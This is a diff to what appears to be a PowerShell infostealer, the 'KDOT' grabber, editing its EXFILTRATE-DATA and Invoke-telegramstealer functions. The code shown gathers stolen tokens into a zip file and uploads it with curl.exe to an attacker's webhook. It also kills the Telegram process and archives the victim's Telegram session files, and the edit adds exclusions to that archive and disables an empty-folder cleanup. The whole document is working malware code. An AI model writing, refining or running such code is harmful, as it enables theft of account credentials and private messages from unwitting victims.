@@ -376,10 +376,10 @@ function EXFILTRATE-DATA {
     Move-Item "$main_temp\tokens.txt" $folder_general -Force
 
     #remove empty dirs
-    do {
-        $dirs = gci $folder_general -directory -recurse | Where { (gci $_.fullName).count -eq 0 } | select -expandproperty FullName
-        $dirs | Foreach-Object { Remove-Item $_ }
-    } while ($dirs.count -gt 0)
+    #do {
+    #    $dirs = gci $folder_general -directory -recurse | Where { (gci $_.fullName).count -eq 0 } | select -expandproperty FullName
+    #    $dirs | Foreach-Object { Remove-Item $_ }
+    #} while ($dirs.count -gt 0)
 
     Compress-Archive -Path "$folder_general" -DestinationPath "$env:LOCALAPPDATA\Temp\KDOT.zip" -Force
     curl.exe -X POST -F 'payload_json={\"username\": \"KDOT\", \"content\": \"\", \"avatar_url\": \"https://i.postimg.cc/k58gQ03t/PTG.gif\"}' -F "file=@$env:LOCALAPPDATA\Temp\KDOT.zip" $webhook
@@ -662,7 +662,8 @@ function Invoke-telegramstealer {
     $processname = "telegram"
     try {if (Get-Process $processname -ErrorAction SilentlyContinue ) {Get-Process -Name $processname | Stop-Process }} catch {}
     $destination = "$folder_messaging\Telegram.zip"
-    $files = Get-ChildItem -Path $path
+    $exclude = @("_*.config","dumps","tdummy","emoji","user_data","user_data#2","user_data#3","user_data#4","user_data#5","user_data#6","*.json","webview")
+    $files = Get-ChildItem -Path $path -Exclude $exclude
     Compress-Archive -Path $files -DestinationPath $destination -CompressionLevel Fastest -Force
 }
 
